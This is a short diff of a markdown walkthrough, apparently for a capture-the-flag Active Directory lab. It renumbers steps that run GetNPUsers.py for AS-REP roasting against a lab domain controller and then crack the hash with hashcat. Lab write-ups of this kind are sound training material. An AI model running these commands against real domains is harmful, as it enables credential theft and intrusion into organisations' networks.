@@ -39,13 +39,13 @@ image:
 	```
 
 ###  GetNPUsers.py - AS-REP Roasting
-- Obtain hash
+1. Obtain hash
 	```
 	GetNPUsers.py spookysec.local/ -usersfile found_users_grep.txt -dc-ip=$ip
 	```
 	![Attacktivedirect AS-REP Roasting.png](Attacktivedirect%20AS-REP%20Roasting.png)
 	- Out of all the users, only `svc-admin` has `pre-auth` disabled
-- Crack hash
+2. Crack hash
 	```
 	hashcat -m 18200 AS-REP_hash.txt passwordlist.txt
 	```
